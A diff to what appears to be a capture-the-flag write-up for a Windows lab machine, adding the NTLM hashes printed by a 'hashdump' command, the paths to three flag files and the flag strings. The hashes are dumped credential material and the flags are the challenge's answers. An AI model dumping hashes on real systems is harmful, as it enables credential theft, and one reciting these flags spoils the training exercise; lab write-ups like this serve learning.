@@ -98,6 +98,9 @@ hashdump
 
 **Output:**
 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1002:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 
 
 ---
@@ -126,12 +129,16 @@ search -f flag*.txt
 ```
 
 **Flag 1** — System root:
+c:\flag1.txt
+flag{access_the_machine}
 
 **Flag 2** — SAM database location:
+c:\Windows\System32\config\flag2.txt
+flag{sam_database_elevated_access}
 
 **Flag 3** — Administrator documents:
-
-
+c:\Users\Jon\Documents\flag3.txt
+flag{admin_documents_can_be_valuable}
 ---
 
 ## Key Takeaways
